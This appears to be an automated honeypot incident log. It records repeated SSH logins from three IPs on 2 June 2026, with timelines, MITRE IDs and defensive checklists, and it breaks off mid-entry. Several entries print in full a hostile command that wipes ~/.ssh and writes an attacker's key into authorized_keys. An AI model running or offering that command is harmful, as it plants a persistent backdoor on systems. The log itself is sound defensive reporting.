| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:11 |
| **Last Seen** | 2026-06-02 16:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:11:22` | `cowrie.session.connect` |
| `2026-06-02 16:11:22` | `cowrie.client.version` |
| `2026-06-02 16:11:22` | `cowrie.client.kex` |
| `2026-06-02 16:11:22` | `cowrie.login.success` |
| `2026-06-02 16:11:23` | `cowrie.session.params` |
| `2026-06-02 16:11:23` | `cowrie.command.input` |
| `2026-06-02 16:11:23` | `cowrie.command.failed` |
| `2026-06-02 16:11:23` | `cowrie.log.closed` |
| `2026-06-02 16:11:24` | `cowrie.session.params` |
| `2026-06-02 16:11:24` | `cowrie.command.input` |
| `2026-06-02 16:11:24` | `cowrie.session.file_download` |
| `2026-06-02 16:11:24` | `cowrie.log.closed` |
| `2026-06-02 16:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01c09c2391a

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:11 |
| **Last Seen** | 2026-06-02 16:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:11:23` | `cowrie.session.connect` |
| `2026-06-02 16:11:23` | `cowrie.client.version` |
| `2026-06-02 16:11:23` | `cowrie.client.kex` |
| `2026-06-02 16:11:23` | `cowrie.login.success` |
| `2026-06-02 16:11:24` | `cowrie.session.params` |
| `2026-06-02 16:11:24` | `cowrie.command.input` |
| `2026-06-02 16:11:24` | `cowrie.command.failed` |
| `2026-06-02 16:11:24` | `cowrie.log.closed` |
| `2026-06-02 16:11:24` | `cowrie.session.params` |
| `2026-06-02 16:11:24` | `cowrie.command.input` |
| `2026-06-02 16:11:24` | `cowrie.session.file_download` |
| `2026-06-02 16:11:24` | `cowrie.log.closed` |
| `2026-06-02 16:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278712a652fa

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:11 |
| **Last Seen** | 2026-06-02 16:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:11:26` | `cowrie.session.connect` |
| `2026-06-02 16:11:26` | `cowrie.client.version` |
| `2026-06-02 16:11:27` | `cowrie.client.kex` |
| `2026-06-02 16:11:27` | `cowrie.login.success` |
| `2026-06-02 16:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18177873fa87

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:11 |
| **Last Seen** | 2026-06-02 16:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:11:26` | `cowrie.session.connect` |
| `2026-06-02 16:11:26` | `cowrie.client.version` |
| `2026-06-02 16:11:27` | `cowrie.client.kex` |
| `2026-06-02 16:11:27` | `cowrie.login.success` |
| `2026-06-02 16:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67118cd4cd01

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 16:11 |
| **Last Seen** | 2026-06-02 16:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:11:55` | `cowrie.session.connect` |
| `2026-06-02 16:11:55` | `cowrie.client.version` |
| `2026-06-02 16:11:55` | `cowrie.client.kex` |
| `2026-06-02 16:11:56` | `cowrie.login.success` |
| `2026-06-02 16:11:56` | `cowrie.session.params` |
| `2026-06-02 16:11:56` | `cowrie.command.input` |
| `2026-06-02 16:11:56` | `cowrie.command.failed` |
| `2026-06-02 16:11:57` | `cowrie.log.closed` |
| `2026-06-02 16:11:57` | `cowrie.session.params` |
| `2026-06-02 16:11:57` | `cowrie.command.input` |
| `2026-06-02 16:11:57` | `cowrie.session.file_download` |
| `2026-06-02 16:11:57` | `cowrie.log.closed` |
| `2026-06-02 16:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749e4badac67

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 16:11 |
| **Last Seen** | 2026-06-02 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:11:59` | `cowrie.session.connect` |
| `2026-06-02 16:11:59` | `cowrie.client.version` |
| `2026-06-02 16:11:59` | `cowrie.client.kex` |
| `2026-06-02 16:12:00` | `cowrie.login.success` |
| `2026-06-02 16:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23353b025f08

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:13 |
| **Last Seen** | 2026-06-02 16:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:13:06` | `cowrie.session.connect` |
| `2026-06-02 16:13:06` | `cowrie.client.version` |
| `2026-06-02 16:13:06` | `cowrie.client.kex` |
| `2026-06-02 16:13:07` | `cowrie.login.success` |
| `2026-06-02 16:13:07` | `cowrie.session.params` |
| `2026-06-02 16:13:07` | `cowrie.command.input` |
| `2026-06-02 16:13:07` | `cowrie.command.failed` |
| `2026-06-02 16:13:08` | `cowrie.log.closed` |
| `2026-06-02 16:13:08` | `cowrie.session.params` |
| `2026-06-02 16:13:08` | `cowrie.command.input` |
| `2026-06-02 16:13:08` | `cowrie.session.file_download` |
| `2026-06-02 16:13:08` | `cowrie.log.closed` |
| `2026-06-02 16:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bdcf96f27a1

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:13 |
| **Last Seen** | 2026-06-02 16:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:13:11` | `cowrie.session.connect` |
| `2026-06-02 16:13:11` | `cowrie.client.version` |
| `2026-06-02 16:13:11` | `cowrie.client.kex` |
| `2026-06-02 16:13:12` | `cowrie.login.success` |
| `2026-06-02 16:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4962be0c0e33

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 16:15 |
| **Last Seen** | 2026-06-02 16:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:15:00` | `cowrie.session.connect` |
| `2026-06-02 16:15:00` | `cowrie.client.version` |
| `2026-06-02 16:15:00` | `cowrie.client.kex` |
| `2026-06-02 16:15:01` | `cowrie.login.success` |
| `2026-06-02 16:15:01` | `cowrie.session.params` |
| `2026-06-02 16:15:01` | `cowrie.command.input` |
| `2026-06-02 16:15:01` | `cowrie.command.failed` |
| `2026-06-02 16:15:01` | `cowrie.log.closed` |
| `2026-06-02 16:15:02` | `cowrie.session.params` |
| `2026-06-02 16:15:02` | `cowrie.command.input` |
| `2026-06-02 16:15:02` | `cowrie.session.file_download` |
| `2026-06-02 16:15:02` | `cowrie.log.closed` |
| `2026-06-02 16:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0883b4a9794

| Field | Detail |
|---|---|
| **Source IP** | `92.113.142[.]203` |
| **First Seen** | 2026-06-02 16:15 |
| **Last Seen** | 2026-06-02 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:15:04` | `cowrie.session.connect` |
| `2026-06-02 16:15:04` | `cowrie.client.version` |
| `2026-06-02 16:15:04` | `cowrie.client.kex` |
| `2026-06-02 16:15:05` | `cowrie.login.success` |
| `2026-06-02 16:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.113.142[.]203` to AbuseIPDB if not already reported
- [ ] Block `92.113.142[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4bdc68ce674

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:17 |
| **Last Seen** | 2026-06-02 16:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:17:00` | `cowrie.session.connect` |
| `2026-06-02 16:17:00` | `cowrie.client.version` |
| `2026-06-02 16:17:00` | `cowrie.client.kex` |
| `2026-06-02 16:17:00` | `cowrie.login.success` |
| `2026-06-02 16:17:01` | `cowrie.session.params` |
| `2026-06-02 16:17:01` | `cowrie.command.input` |
| `2026-06-02 16:17:01` | `cowrie.command.failed` |
| `2026-06-02 16:17:01` | `cowrie.log.closed` |
| `2026-06-02 16:17:01` | `cowrie.session.params` |
| `2026-06-02 16:17:01` | `cowrie.command.input` |
| `2026-06-02 16:17:01` | `cowrie.session.file_download` |
| `2026-06-02 16:17:01` | `cowrie.log.closed` |
| `2026-06-02 16:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-521dba669c8f

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:17 |
| **Last Seen** | 2026-06-02 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:17:03` | `cowrie.session.connect` |
| `2026-06-02 16:17:03` | `cowrie.client.version` |
| `2026-06-02 16:17:03` | `cowrie.client.kex` |
| `2026-06-02 16:17:04` | `cowrie.login.success` |
| `2026-06-02 16:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b2d2630acd

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:18 |
| **Last Seen** | 2026-06-02 16:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:18:15` | `cowrie.session.connect` |
| `2026-06-02 16:18:15` | `cowrie.client.version` |
| `2026-06-02 16:18:15` | `cowrie.client.kex` |
| `2026-06-02 16:18:16` | `cowrie.login.success` |
| `2026-06-02 16:18:16` | `cowrie.session.params` |
| `2026-06-02 16:18:16` | `cowrie.command.input` |
| `2026-06-02 16:18:16` | `cowrie.command.failed` |
| `2026-06-02 16:18:17` | `cowrie.log.closed` |
| `2026-06-02 16:18:17` | `cowrie.session.params` |
| `2026-06-02 16:18:17` | `cowrie.command.input` |
| `2026-06-02 16:18:17` | `cowrie.session.file_download` |
| `2026-06-02 16:18:17` | `cowrie.log.closed` |
| `2026-06-02 16:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c64751d0c0e

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:18 |
| **Last Seen** | 2026-06-02 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:18:20` | `cowrie.session.connect` |
| `2026-06-02 16:18:20` | `cowrie.client.version` |
| `2026-06-02 16:18:20` | `cowrie.client.kex` |
| `2026-06-02 16:18:20` | `cowrie.login.success` |
| `2026-06-02 16:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f921b86978a

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:20 |
| **Last Seen** | 2026-06-02 16:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:20:02` | `cowrie.session.connect` |
| `2026-06-02 16:20:02` | `cowrie.client.version` |
| `2026-06-02 16:20:03` | `cowrie.client.kex` |
| `2026-06-02 16:20:03` | `cowrie.login.success` |
| `2026-06-02 16:20:04` | `cowrie.session.params` |
| `2026-06-02 16:20:04` | `cowrie.command.input` |
| `2026-06-02 16:20:04` | `cowrie.command.failed` |
| `2026-06-02 16:20:04` | `cowrie.log.closed` |
| `2026-06-02 16:20:04` | `cowrie.session.params` |
| `2026-06-02 16:20:04` | `cowrie.command.input` |
| `2026-06-02 16:20:05` | `cowrie.session.file_download` |
| `2026-06-02 16:20:05` | `cowrie.log.closed` |
| `2026-06-02 16:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28d70468c9ba

| Field | Detail |
|---|---|
| **Source IP** | `195.199.210[.]194` |
| **First Seen** | 2026-06-02 16:20 |
| **Last Seen** | 2026-06-02 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:20:07` | `cowrie.session.connect` |
| `2026-06-02 16:20:07` | `cowrie.client.version` |
| `2026-06-02 16:20:07` | `cowrie.client.kex` |
| `2026-06-02 16:20:08` | `cowrie.login.success` |
| `2026-06-02 16:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.199.210[.]194` to AbuseIPDB if not already reported
- [ ] Block `195.199.210[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acabf53d5892

| Field | Detail |
|---|---|
| **Source IP** | `51.75.64[.]35` |
| **First Seen** | 2026-06-02 16:22 |
| **Last Seen** | 2026-06-02 16:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:22:41` | `cowrie.session.connect` |
| `2026-06-02 16:22:41` | `cowrie.client.version` |
